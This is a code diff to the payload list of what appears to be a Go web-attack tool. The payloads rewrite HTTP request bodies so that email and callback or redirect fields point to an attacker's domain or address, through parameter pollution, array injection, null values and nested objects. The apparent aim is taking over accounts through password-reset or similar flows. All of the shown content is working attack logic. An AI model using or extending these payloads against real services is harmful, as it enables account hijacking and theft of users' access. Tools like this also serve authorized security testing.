@@ -9,9 +9,45 @@ type Payload struct {
 	Name        string
 	Mode        string
 	Description string
+	// Requires optionally gates this payload to a specific body type ("form", "json").
+	// If set and the request body type doesn't match, the payload is skipped entirely.
+	Requires string
+	// ShouldRun optionally gates this payload on the request contents.
+	// If set and it returns false, the payload is skipped entirely.
+	ShouldRun func(r ParsedRequest) bool
 	// Preview returns a human-readable before→after summary of what this payload changes.
 	Preview func(r ParsedRequest, attackerDomain, attackerEmail string) string
 	Apply   func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest
+}
+
+// extraFieldPayload builds a body payload that updates a single callback/redirect
+// field to the attacker domain. It only runs when that field already exists in the
+// request — it never injects new keys. One payload per field is intentional:
+// injecting every candidate field in a single request makes it impossible to tell
+// which field the server actually honors (and unknown keys can make strict parsers
+// reject the whole request).
+func extraFieldPayload(field string) Payload {
+	return Payload{
+		Name: field + " field",
+		Mode: "body",
+		ShouldRun: func(r ParsedRequest) bool {
+			_, ok := r.Fields[field]
+			return ok
+		},
+		Description: "update existing " + field + " field to attacker domain — runs only if the field is already present",
+		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
+			modified := DeepCopyFields(r.Fields)
+			modified[field] = "https://" + attackerDomain
+			return PreviewBodyFields(r.Fields, modified)
+		},
+		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
+			r.Fields[field] = "https://" + attackerDomain
+			newBody := RebuildBody(r)
+			UpdateContentLength(&r, newBody)
+			r.Body = newBody
+			return r
+		},
+	}
 }
 
 var Payloads = []Payload{
@@ -247,41 +283,6 @@ var Payloads = []Payload{
 		},
 	},
 	{
-		Name:        "Mixed array",
-		Mode:        "body",
-		Description: "first email field becomes array with attacker value, rest stay as strings",
-		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
-			modified := DeepCopyFields(r.Fields)
-			first := true
-			for k, v := range modified {
-				if !isEmailField(k) {
-					continue
-				}
-				if first {
-					modified[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
-					first = false
-				}
-			}
-			return PreviewBodyFields(r.Fields, modified)
-		},
-		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
-			first := true
-			for k, v := range r.Fields {
-				if !isEmailField(k) {
-					continue
-				}
-				if first {
-					r.Fields[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
-					first = false
-				}
-			}
-			newBody := RebuildBody(r)
-			UpdateContentLength(&r, newBody)
-			r.Body = newBody
-			return r
-		},
-	},
-	{
 		Name:        "Null confusion",
 		Mode:        "body",
 		Description: "set all field values to null",
@@ -406,29 +407,12 @@ var Payloads = []Payload{
 			return r
 		},
 	},
-	{
-		Name:        "Extra fields",
-		Mode:        "body",
-		Description: "append common callback/redirect fields pointing to attacker domain",
-		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
-			modified := DeepCopyFields(r.Fields)
-			extras := []string{"redirectUrl", "callbackUrl", "next", "returnUrl", "callback", "redirect"}
-			for _, k := range extras {
-				modified[k] = "https://" + attackerDomain
-			}
-			return PreviewBodyFields(r.Fields, modified)
-		},
-		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
-			extras := []string{"redirectUrl", "callbackUrl", "next", "returnUrl", "callback", "redirect"}
-			for _, k := range extras {
-				r.Fields[k] = "https://" + attackerDomain
-			}
-			newBody := RebuildBody(r)
-			UpdateContentLength(&r, newBody)
-			r.Body = newBody
-			return r
-		},
-	},
+	extraFieldPayload("redirectUrl"),
+	extraFieldPayload("callbackUrl"),
+	extraFieldPayload("next"),
+	extraFieldPayload("returnUrl"),
+	extraFieldPayload("callback"),
+	extraFieldPayload("redirect"),
 	{
 		Name:        "Nested object",
 		Mode:        "body",
@@ -572,31 +556,26 @@ var Payloads = []Payload{
 		},
 	},
 	{
-		Name:        "Parameter pollution form",
+		Name:        "Parameter pollution",
 		Mode:        "body",
+		Requires:    "form",
 		Description: "duplicate email params with attacker value second (form-encoded only)",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
-			if r.BodyType != "form" {
-				return "  (skipped — not a form-encoded request)"
-			}
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
 				if !isEmailField(k) {
 					continue
 				}
-				modified[k] = anyToString(v) + "&" + k + "=" + InjectValue(k, attackerEmail, attackerDomain)
+				modified[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
 			}
 			return PreviewBodyFields(r.Fields, modified)
 		},
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
-			if r.BodyType != "form" {
-				return r
-			}
 			for k, v := range r.Fields {
 				if !isEmailField(k) {
 					continue
 				}
-				r.Fields[k] = fmt.Sprintf("%v", v) + "&" + k + "=" + InjectValue(k, attackerEmail, attackerDomain)
+				r.Fields[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
 			}
 			newBody := RebuildBody(r)
 			UpdateContentLength(&r, newBody)
